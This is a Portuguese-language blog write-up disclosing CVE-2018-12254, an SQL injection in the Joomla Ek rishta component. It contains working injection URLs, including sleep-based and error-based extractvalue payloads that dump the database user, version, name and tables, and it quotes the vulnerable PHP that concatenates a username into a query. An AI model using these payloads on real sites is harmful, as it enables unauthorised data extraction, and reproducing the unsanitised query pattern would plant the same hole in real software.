<!doctype html>

<html lang="en">
<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="songroger">

  <title>CVE-2018-12254 - Sql Injection Joomla Ek rishta Component</title>

  <meta name="description" content="&lt;p&gt;	A vulnerabilidade foi encontrada de uma forma um pouco inusitada. A alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curs...">

  <!-- Open graph data -->
  <meta property="og:site_name" content="m<>4k'4"br0">
  <meta property="og:title" content="CVE-2018-12254 - Sql Injection Joomla Ek rishta Component">
  <meta property="og:url" content="http://localhost:4000/sql-injection-joomla-component/">
  <meta property="og:type" content="article">
  <meta property="og:description" content="&lt;p&gt;	A vulnerabilidade foi encontrada de uma forma um pouco inusitada. A alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curs...">

  <!-- Standard Stuff -->
  <link rel="canonical" href="http://localhost:4000/sql-injection-joomla-component/"/>
  <link rel="alternate" type="application/rss+xml" title="m<>4k'4"br0" href="http://localhost:4000/feed.xml"/>

  <!-- Favicons -->
  <link rel="shortcut icon" href="">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-config" content="/assets/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">

  <!-- Styles -->
  
    <style type="text/css">
      ::selection {
    background: #1565c0;
    color: #fff;
    text-shadow: none
}

html {
    font-size: 109.375%;
    -moz-osx-font-smoothing: grayscale;
    -webkit-font-smoothing: antialiased;
    font-smoothing: antialiased;
    text-size-adjust: 100%;
    box-sizing: border-box
}

@media screen and (min-width:700px) {
    html {
        font-size: 125%
    }
}

@media screen and (min-width:1440px) {
    html {
        font-size: 140.625%
    }
}

*,
:after,
:before {
    margin: 0;
    padding: 0;
    box-sizing: inherit
}

body {
    color: #444;
    font-family: Georgia, Source Sans Pro, sans-serif;
    font-size: .9rem;
    line-height: 1.6rem
}

img {
    display: block;
    max-width: 100%;
    height: auto;
    border: 0
}

a:active,
a:hover,
a:visited {
    color: #444;
    text-decoration: none
}

strong {
    font-weight: 700
}

em {
    font-style: italic
}

a {
    background: transparent;
    color: #1565c0;
    text-decoration: none;
    cursor: pointer;
    word-wrap: break-word
}

a:active,
a:focus,
a:hover {
    outline: 0;
    text-decoration: none
}

h1,
h2,
h3,
h4,
h5,
h6,
p {
    margin-bottom: .2rem
}

h1,
h2,
h3,
h4,
h5,
h6 {
    color: #000;
    font-weight: 700;
    vertical-align: middle
}

.cdf{
    width: 13px;
    vertical-align: middle;
    filter: invert(28%) sepia(0%) saturate(1347%) hue-rotate(218deg) brightness(87%) contrast(92%);
    display: initial;
}
h1:not(:first-child),
h2:not(:first-child),
h3:not(:first-child),
h4:not(:first-child),
h5:not(:first-child),
h6:not(:first-child) {
    margin-top: 2.4rem
}

h1 {
    font-size: 2rem;
    line-height: 3.2rem
}

h2 {
    font-size: 1.5rem;
    line-height: 2.4rem
}

h3 {
    font-size: 1.17rem
}

h4 {
    font-size: 1rem
}

h5 {
    font-size: .707rem
}

h6 {
    font-size: .5rem
}

ol,
ul {
    margin: 0 0 1.6rem 1.6rem
}

ol ol,
ol ul,
ul ol,
ul ul {
    margin: 0 1.6rem
}

hr {
    display: block;
    height: 1.6rem;
    border: 0;
    box-shadow: inset 0 1px 0 #eee
}

blockquote {
    margin-bottom: 1.6rem;
    padding: 1.6rem;
    border-left: 4px solid #e6e6e6;
    background: #f7f7f7
}

blockquote p {
    margin: 0
}

.col {
    max-width: calc(700px + 1.6rem);
    margin: 0 auto;
    padding: 0 .8rem
}

@media screen and (min-width:1440px) {
    .col {
        max-width: calc(800px + 1.6rem)
    }
}

.header {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-around;
    margin-bottom: 2rem;
    box-shadow: 0 1px 0 0 #eee
}

@media screen and (min-width:734px) {
    .header {
        font-size: .75rem
    }
}

.header__logo {
    margin-bottom: 0;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.6rem
}

.header__logo img {
    display: initial;
    width: 30px;
    height: 30px;
    vertical-align: middle;
    border-radius: 15px;
    opacity: 1
}

.header__logo img:hover {
    opacity: .5;
    transition: all .5s ease-in
}

.header__logo a {
    color: #999;
    text-transform: uppercase
}

@media screen and (min-width:734px) {
    .header__logo {
        font-size: .75rem
    }
}

.header__nav {
    display: flex;
    flex-wrap: wrap
}

.header__nav a {
    color: #444
}

.header__nav a:hover {
    color: #999;
    transition: all .5s ease-in
}

.header__link {
    padding: .8rem;
    color: #444;
    text-decoration: none;
    border-bottom: 2px solid transparent;
    padding-bottom: 1px
}

.header__link:hover {
    transition: all .5s ease-in;
    border-color: hsla(34, 5%, 70%, .7)
}

.header__link--logo {
    padding: .8rem;
    display: block
}

.header__link--logo:focus,
.header__link--logo:hover {
    color: #444;
    transition: all .5s ease-in
}

.footer {
    margin-top: .5rem;
    padding: 1.6rem 0;
    box-shadow: inset 0 1px 0 #eee
}

.footer .col {
    font-size: 13px;
    text-align: center
}

.subscribe {
    color: #999;
    transition: all .25s ease-in
}

.subscribe:hover {
    color: #444;
    text-decoration: none
}

.blocks {
    display: flex;
    align-items: center;
    margin-bottom: .1rem
}

.blocks--space {
    justify-content: space-between
}

.block__item--mr {
    margin-right: .8rem
}

.blocks__item a {
    text-decoration: none;
    color: #999;
    border: 3px solid rgba(0, 0, 0, .1);
    border-radius: 20px;
    padding: 1px 15px;
    font-family: Georgia, Microsoft YaHei, sans-serif
}

.blocks__item a:hover {
    color: #444;
    border-color: #999;
    transition: all .5s ease-in
}

.blocks__item .btn {
    box-shadow: inset 0 0 0 0 #1565c0
}

.article {
    margin-bottom: 3rem;
    animation: itemshow .9s linear
}

.article__title {
    margin-bottom: .8rem
}

.article__title--single,
.article__title a {
    font-family: Georgia, Microsoft YaHei, sans-serif
}

.article__title a {
    color: #444;
    transition: all .25s ease-in
}

.article__title a:hover {
    color: #999;
    text-decoration: none
}

.article__date {
    display: block;
    margin-bottom: .8rem;
    font-size: .7501rem
}

.cover {
    margin-bottom: .5rem
}

.cover img {
    width: 100%
}

.article__more {
    color: #999;
    text-decoration: none
}

.article__more:hover {
    transition: all .5s ease-in;
    color: #444;
    text-decoration: none
}

.post-tags {
    text-align: right;
    text-decoration: none;
    font: italic 700 12px/30px Georgia, serif
}

.post-tags a {
    color: #999
}

.post-tags a:hover {
    color: #444;
    text-decoration: none
}

@-webkit-keyframes 'itemshow' {
    0% {
        top: -60px;
        opacity: 0
    }

    33% {
        top: -40px;
        opacity: .2
    }

    66% {
        top: -20px;
        opacity: .6
    }

    to {
        top: 0;
        opacity: 1
    }
}

@keyframes 'itemshow' {
    0% {
        top: -60px;
        opacity: 0
    }

    33% {
        top: -40px;
        opacity: .2
    }

    66% {
        top: -20px;
        opacity: .6
    }

    to {
        top: 0;
        opacity: 1
    }
}

.arch-item {
    margin-bottom: 10px;
    animation: itemshow .9s linear
}

.arch-title {
    color: #444;
    font-size: 20px;
    font-family: Georgia, Hiragino Sans GB, Microsoft YaHei, sans-serif;
    font-weight: 700;
    padding-right: 10px
}

.arch-title:hover {
    color: #999;
    transition: all .25s ease-in
}

time {
    font-size: 15px;
    font-family: Optima, Helvetica Neue, sans-serif
}

.arch-desc,
time {
    color: #999
}

code,
pre {
    background: #f7f7f7;
    font-family: Source Code Pro, monospace;
    font-size: .847rem;
    overflow-x: auto;
    vertical-align: top
}

.highlight {
    margin-bottom: 1.6rem;
    padding: .8rem;
    background: #f7f7f7;
    box-shadow: inset 0 0 0 1px #eee
}

.highlight .c {
    color: #998
}

.highlight .err {
    background-color: #e3d2d2;
    color: #a61717
}

.highlight .k,
.highlight .o {
    font-weight: 400
}

.highlight .cm {
    color: #998
}

.highlight .cp {
    color: #999;
    font-weight: 400
}

.highlight .c1 {
    color: #998
}

.highlight .cs {
    color: #999;
    font-weight: 400
}

.highlight .gd {
    background-color: #fdd;
    color: #000
}

.highlight .gd .x {
    background-color: #faa;
    color: #000
}

.highlight .gr {
    color: #a00
}

.highlight .gh {
    color: #999
}

.highlight .gi {
    background-color: #dfd;
    color: #000
}

.highlight .gi .x {
    background-color: #afa;
    color: #000
}

.highlight .go {
    color: #888
}

.highlight .gp {
    color: #555
}

.highlight .gs {
    font-weight: 400
}

.highlight .gu {
    color: #aaa
}

.highlight .gt {
    color: #a00
}

.highlight .kc,
.highlight .kd,
.highlight .kp,
.highlight .kr,
.highlight .kt {
    font-weight: 400
}

.highlight .kt {
    color: #458
}

.highlight .m {
    color: #099
}

.highlight .s {
    color: #d14
}

.highlight .na {
    color: teal
}

.highlight .nb {
    color: #0086b3
}

.highlight .nc {
    color: #458;
    font-weight: 400
}

.highlight .no {
    color: teal
}

.highlight .ni {
    color: purple
}

.highlight .ne,
.highlight .nf {
    color: #900;
    font-weight: 400
}

.highlight .nn {
    color: #555
}

.highlight .nt {
    color: navy
}

.highlight .nv {
    color: teal
}

.highlight .ow {
    font-weight: 400
}

.highlight .w {
    color: #bbb
}

.highlight .mf,
.highlight .mh,
.highlight .mi,
.highlight .mo {
    color: #099
}

.highlight .s2,
.highlight .sb,
.highlight .sc,
.highlight .sd,
.highlight .se,
.highlight .sh,
.highlight .si,
.highlight .sx {
    color: #d14
}

.highlight .sr {
    color: #009926
}

.highlight .s1 {
    color: #d14
}

.highlight .ss {
    color: #990073
}

.highlight .bp {
    color: #999
}

.highlight .vc,
.highlight .vg,
.highlight .vi {
    color: teal
}

.highlight .il {
    color: #099
}
    </style>
  


</head>

<body>

  <header class="header">

    
      <h1 class="header__logo">
        <a href="/" class="header__link--logo">m<>4k'4"br0</a>
      </h1>
    

    <nav class="header__nav" role="navigation">      
      <a href="/archive/" class="header__link">Archive</a>
      <!-- <a href="http://github.com/m4k4br0" class="header__link" target="_blank">Github</a> -->
      <a href="/about/" class="header__link">About</a>
    </nav>
  </header>

  <main class="col">


<article class="article">
  <h2 class="article__title article__title--single">CVE-2018-12254 - Sql Injection Joomla Ek rishta Component</h2>
  <time class="article__date" datetime="2018-06-11"> 00:00 Jun.11-2018</time>
  
  <p>	A vulnerabilidade foi encontrada de uma forma um pouco inusitada. A alguns dias o Daybson estava subindo um laboratório de teste novo, para  o curso de Pentest Profissional da Desec Security, quando me chamou para testa-lo, eu em particular não sabia que vulnerabilidade havia no laboratório, apenas loguei e fui testar. Notei que eu tinha o nome do usuário na seguinte url(<code>index.php/home/requested_user/Sent%20interest/corp</code>) e me pareceu um pouco estranho, talvez fosse gerado um novo arquivo durante o registro ou algo assim, mas na verdade notei que aquilo não era um arquivo, era realmente um parâmetro da url.</p>
<br>
	<p>O teste inicial logicamente foi adicionar uma aspas simples e ver o que iria me retornar:</p>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20a%23</code>
<center>
<img src="https://i.imgur.com/AYHQAWL.png">
</center>
<br>
	<p>Então, seguindo o erro, temos um Sql Injection aqui!</p>
<br>
	<p>Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:</p>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23</code>
<center>
<img src="https://i.imgur.com/4LUyOHe.png">
</center>
<br>
	<p>Até este ponto estava tudo bem, porém notei uma limitação ao tentar dumpar a db no modo clássico, até mesmo usando blind. Me pareceu estranho não conseguir resposta para algumas querys, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection.</p>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23</code>
<center>
<img src="https://i.imgur.com/xZwEZAI.png">
</center>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,version())%20%23</code>
<center>
<img src="https://i.imgur.com/M7LCI6d.png">
</center>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23</code>
<center>
<img src="https://i.imgur.com/8mRdLKG.png">
</center>
<br>
<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23</code>
<center>
<img src="https://i.imgur.com/QU7faTN.png">
</center>
<br>
	<p>Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!</p>
<br>
	<p>Depois disso, eu ainda assim fiquei curioso para saber como que o componente estava capturando esta parte da url, então baixei o código dele e vasculhei até encontrar o seguinte trecho:</p>
<br>
<code>router.php</code>
<br>
<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="mi">238</span> <span class="o">-</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$segments</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$segments</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">'requested_user'</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">239</span> <span class="o">-</span> 	<span class="nv">$c_id</span>	<span class="o">=</span> <span class="nf">EkrishtaUsrID</span><span class="p">(</span><span class="nv">$segments</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="mi">240</span> <span class="o">-</span> 	<span class="k">if</span><span class="p">(</span><span class="nv">$segments</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"Sent interest"</span><span class="p">)</span>
<span class="mi">241</span> <span class="o">-</span>	  <span class="nv">$vars</span><span class="p">[</span><span class="s1">'rid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$c_id</span><span class="p">;</span>
<span class="mi">242</span> <span class="o">-</span>	<span class="k">else</span>
<span class="mi">243</span> <span class="o">-</span>	  <span class="nv">$vars</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$c_id</span><span class="p">;</span>
<span class="mi">244</span> <span class="o">-</span> <span class="p">}</span></code></pre></figure>

	<p>Fazendo uma analise rápida, sabemos que o <code>$c_id</code> esta capturando o segmento que está o nosso nome de usuário e adicionando ele a um array (<code>$vars</code>), podemos basicamente adivinhar que a função <code>EkrishtaUsrID()</code> está buscando o nosso id ou o nome do usuário no banco de dados, mas vamos ver o que realmente ela está fazendo.</p>
<br>
<br>
	<p>Fazendo uma procura pela função <code>EkrishtaUsrID()</code>, encontrei ela presente no mesmo arquivo e é possível ver que que existe uma falta de sanitização nas linhas <code>295</code> e <code>305</code>.</p>
<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="mi">291</span> <span class="o">-</span> <span class="k">function</span> <span class="n">EkrishtaUsrName</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span>
<span class="mi">292</span> <span class="o">-</span> <span class="p">{</span>
<span class="mi">293</span> <span class="o">-</span>
<span class="mi">294</span> <span class="o">-</span>	 <span class="nv">$db</span> <span class="o">=</span> <span class="nc">JFactory</span><span class="o">::</span><span class="nf">getDBO</span><span class="p">();</span>
<span class="mi">295</span> <span class="o">-</span>	 <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT `username` FROM #__users WHERE `id`='"</span><span class="mf">.</span> <span class="nv">$uid</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
<span class="mi">296</span> <span class="o">-</span>	 <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">setQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="mi">297</span> <span class="o">-</span> 	 <span class="k">return</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">loadResult</span><span class="p">();</span>
<span class="mi">298</span> <span class="o">-</span>
<span class="mi">299</span> <span class="o">-</span> <span class="p">}</span>
<span class="mi">300</span> <span class="o">-</span>
<span class="mi">301</span> <span class="o">-</span> <span class="k">function</span> <span class="n">EkrishtaUsrID</span><span class="p">(</span><span class="nv">$uid_name</span><span class="p">)</span>
<span class="mi">302</span> <span class="o">-</span> <span class="p">{</span>
<span class="mi">303</span> <span class="o">-</span>
<span class="mi">304</span> <span class="o">-</span> 	 <span class="nv">$db</span> <span class="o">=</span> <span class="nc">JFactory</span><span class="o">::</span><span class="nf">getDBO</span><span class="p">();</span>
<span class="mi">305</span> <span class="o">-</span>	 <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT `id` FROM #__users WHERE `username`= '"</span> <span class="mf">.</span><span class="nv">$uid_name</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
<span class="mi">306</span> <span class="o">-</span>	 <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">setQuery</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="mi">307</span> <span class="o">-</span>	 <span class="k">return</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">loadResult</span><span class="p">();</span>
<span class="mi">308</span> <span class="o">-</span>
<span class="mi">309</span> <span class="o">-</span> <span class="p">}</span></code></pre></figure>

	<p>Para finalizar a história, a vulnerabilidade que eu encontrei não estava dentro daquilo que estava programado para o laboratório e também não estava assinada ou relacionada a qualquer outra descoberta, então peguei uma cve :).</p>

  
</article>




<footer class="footer">
	<div class="col">
		© 2018 m<>4k'4"br0 | <a href="/feed.xml" class="subscribe">RSS</a>
	</div>
</footer>

<script type="text/javascript">
  //友盟统计
  var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
  document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1260641879'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1260641879' type='text/javascript'%3E%3C/script%3E"));
</script>
</body>
</html>
